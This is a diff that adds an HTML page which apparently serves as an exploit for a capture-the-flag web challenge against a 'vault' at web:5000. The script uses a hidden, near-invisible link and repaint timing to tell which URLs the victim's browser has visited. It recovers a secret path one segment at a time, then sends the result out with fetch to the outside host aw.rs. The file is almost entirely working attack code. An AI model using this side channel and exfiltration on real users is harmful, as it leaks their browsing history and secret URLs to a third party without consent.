@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <style>
+        #link {
+            position: absolute;
+            top: 0;
+            opacity: 0.001;
+            pointer-events: none;
+        }
+
+        a {
+            display: block;
+        }
+
+        .container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+        }
+
+        .links {
+            width: 30vw;
+        }
+    </style>
+</head>
+
+<body>
+    <a id="link" href=""></a>
+
+    <div class="container">
+        <div class="links">
+            <h2>Visited links</h2>
+            <hr>
+            <div id="seen"></div>
+        </div>
+        <div class="links">
+            <h2>Unvisted links</h2>
+            <hr>
+            <div id="unseen"></div>
+        </div>
+    </div>
+
+    <script>
+        // const VAULT_URL = "http://localhost:5000/";
+        const VAULT_URL = "http://web:5000/";
+
+        const link = document.getElementById("link");
+        const seen = document.getElementById("seen");
+        const unseen = document.getElementById("unseen");
+
+        async function getLinkTime(url) {
+            let t1, t2 = 0;
+            await new Promise((resolve) => {
+                requestAnimationFrame(() => {
+                    t1 = performance.now();
+                    link.href = url;
+                    requestIdleCallback(() => {
+                        t2 = performance.now()
+                        resolve();
+                    }, { timeout: 1000 });
+                });
+            });
+            return t2 - t1;
+        }
+
+        async function hasLinkBeenVisited(url) {
+            await getLinkTime("");
+            const urlTime = await getLinkTime(url);
+            const urlTimeUnvisited = await getLinkTime(url + "?" + performance.now())
+            return urlTimeUnvisited > urlTime;
+        }
+
+        async function checkUrl(url) {
+            const a = document.createElement("a");
+            a.href = url;
+            a.innerText = url;
+
+            if (await hasLinkBeenVisited(url)) {
+                seen.prepend(a);
+                return true;
+            } else {
+                unseen.prepend(a);
+                return false;
+            }
+        }
+
+        async function setup() {
+            link.innerText = "aa ".repeat(0x10000);
+
+            let base = VAULT_URL;
+
+            while (true) {
+                let found = false;
+                const urls = [];
+                for (let i = 0; i < 33; i++) {
+                    urls.push(`${base}${i}/`)
+                }
+                urls.push("http://adsfadsfadf.com");
+                for (const url of urls) {
+                    if (await checkUrl(url)) {
+                        base = url;
+                        found = true;
+                        break;
+                    }
+                }
+                if (!found) {
+                    break;
+                }
+            }
+
+            await fetch("http://aw.rs?" + base)
+        }
+        setup()
+    </script>
+</body>
+
+</html>
